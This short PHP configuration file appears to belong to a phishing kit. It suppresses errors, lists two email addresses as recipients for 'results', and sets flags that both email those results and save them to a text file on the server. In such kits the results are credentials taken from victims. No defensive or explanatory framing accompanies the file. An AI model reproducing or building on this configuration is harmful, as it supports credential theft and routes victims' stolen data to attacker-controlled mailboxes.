<?php
error_reporting(0);
/*
Created by Me --  
*/
$Your_Email = "babybony168@gmail.com,rzltnouv@yahooo.com";  // Set your email
$Send_Log=1;  // Sends results to above email
$Save_Log=1;  // Saves results to server within a txt file


?>